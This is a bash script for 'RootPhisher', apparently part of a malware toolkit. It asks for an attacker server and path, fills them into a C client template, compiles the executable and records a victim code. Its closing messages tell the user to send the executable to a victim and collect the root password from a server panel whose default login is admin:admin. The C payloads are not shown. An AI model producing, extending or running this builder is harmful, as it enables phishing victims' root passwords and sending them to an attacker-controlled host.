#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;34m"
NOCOLOR="\033[0m"

clear
cat files/banner # shows baner
echo ""
echo "Welcome to RootPhisher"
echo "Press any key to start..."
read start
echo ""
echo ""
echo "[i] Follow the options to configure the client."
echo ""
pwds=$(pwd)
echo "Current: $pwds"
echo -n "\033[1;32m[=] Path to generate the client: \033[0m" # path to generate
read path
echo ""
echo ""
echo "Eg.: client"
echo -n "\033[1;32m[=] Name for the file:\033[0m "
read name
echo ""
echo ""
echo "Eg.: attacker.com, ONLY SERVER!"
echo -n "\033[1;32m[=] Your server : \033[0m"
read server
echo ""
echo ""
echo "Eg.: if the path is 'attacker.com/rootphisher/pwn', type 'rootphisher/pwn'"
echo "(Without '/')"
echo "If it is '/' leave it in blank"
echo -n "\033[1;32m[=] Server Path: \033[0m"
read rpath
code=$(shuf -n 1 -i 0-5000)
echo ""
echo "GIVEN OPTIONS"
echo "================"
echo ""
echo "\033[1;34mName:\033[0m $name"
echo "\033[1;34mVictim code:\033[0m $code"
echo "\033[1;34mServer:\033[0m http://$server/$rpath"
echo "\033[1;34mPath:\033[0m $path"
echo ""
echo ""
echo "CLIENTS"
echo "=========="
echo "1) \033[1;31mError_Msg_Client\033[0m => After the execution, shows you an error saying software not compatible or a non-rooted user executed the program."
echo ""
echo "2) \033[1;31mCmd_Prompt_Client\033[0m => After the execution, open a very simple command shell line."
echo ""
echo ""
echo "\033[1;32m[*] Enter the number of the option do you want.\033[0m"
echo ""
echo -n "Client> "
read opt
case $opt in

1) echo "[*] Selected: $opt [ Error_Msg_Client ]";
cp files/Error_Msg_Client.c .client
;;

2) echo "[*] Selected: $opt [ Cmd_Prompt_Client ]";
cp files/Cmd_Prompt_Client.c .client
;;

*) echo "$opt does not exists";
echo "Press enter to exit ...";
read foo;;
esac

echo "[*] Creating the C file with the given options..."
sed -i "s/<SERVER>/$server/g" ".client"
sed -i "s/<PATH>/$rpath/g" ".client"
sed -i "s/<CODE>/$code/g" ".client"
cp .client $path/$name.c
rm .client
echo "[*] Compiling the C file ..."
gcc -o $path/$name $path/$name.c > /dev/null 2>&1
rm $path/$name.c
echo "\033[1;32m[+] Done.\033[0m"
echo "[+] Executable generated successfully in $path/$name"
echo "[*] Saving configuration in codes/$code"
echo "\033[1;32m[+] Done.\033[0m"
echo "[i] Now send the executable to your victim and wait to obtain root password ;)"
echo "[i] Find the root password in the Server Panel by searching for the victim code showed before"
echo "[i] Default Server Panel Access Credentials => admin:admin"
echo "GIVEN OPTIONS" > codes/$code
echo "================" >> codes/$code
echo "" >> codes/$code
echo "Name: $name" >> codes/$code
echo "Victim code: $code" >> codes/$code
echo "Server: http://$server/$rpath" >> codes/$code
echo "Path: $path" >> codes/$code
echo "" >> codes/$code
exit
